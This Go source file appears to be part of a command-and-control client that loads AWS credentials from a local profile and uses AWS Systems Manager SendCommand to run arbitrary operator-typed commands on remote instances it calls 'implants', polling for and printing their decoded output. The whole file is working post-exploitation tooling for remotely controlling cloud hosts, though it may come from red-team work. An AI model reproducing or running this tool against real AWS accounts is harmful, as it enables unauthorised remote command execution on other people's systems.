package completion

import (
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"os"
	"strings"

	"github.com/grines/ssmmmm-client/control/ssmaws"
)

func Commands(line string) {
	switch {

	//Load aws profile from .aws/credentials
	case strings.HasPrefix(line, "token profile"):
		help := HelpText("profile ec2user us-east-1", "Profile is used to load a profile from ~/.aws/credentials.", "enabled")
		parse := ParseCMD(line, 4, help)
		if parse != nil {
			target = parse[2]
			region = parse[3]
			sess = getProfile(target, region)
			if sess != nil {
				fmt.Println(connected)
			}
		}

	case strings.HasPrefix(line, "get-caller-identity") && connected == true:
		help := HelpText("get-caller-identity", "GetSessionToken returns current token details.", "enabled")
		parse := ParseCMD(line, 1, help)
		if parse != nil {
			data := GetCallerIdentity(sess)
			fmt.Println(data)
		}

	case strings.HasPrefix(line, "implants ") && connected == true:
		help := HelpText("list implants", "list implants", "enabled")
		parse := ParseCMD(line, 2, help)
		if parse != nil {
			instance = parse[1]
		}

	//Show command history
	case line == "history":
		dat, err := ioutil.ReadFile("/tmp/readline.tmp")
		if err != nil {
			break
		}
		fmt.Print(string(dat))

	//exit
	case line == "quit":
		connected = false

	//Default if no case
	default:
		instID := strings.Split(instance, ":")
		cmdString := line
		if connected == false {
			fmt.Println("You are not connected to a profile.")
			return
		}
		if instance == "" {
			fmt.Println("You are not connected to an implant")
			return
		}
		if cmdString == "exit" {
			os.Exit(1)
		}
		if cmdString != "" {
			go commander(cmdString, instID[1])
		} else {
			fmt.Println(cmdString)
		}

	}
}

func base64Decode(str string) string {
	data, _ := base64.StdEncoding.DecodeString(str)
	return string(data)
}

func commander(cmdString string, instID string) {
	cmdid := ssmaws.SendCommand(sess, cmdString, instID)

	for {
		status := ssmaws.GetCommandOutput(sess, cmdid, instID)
		if *status.Status == "Success" {
			break
		}
	}

	cmdOut := ssmaws.GetCommandOutput(sess, cmdid, instID)
	sout := strings.TrimSuffix(*cmdOut.StandardOutputContent, "\n")
	fmt.Println(base64Decode(sout))
}
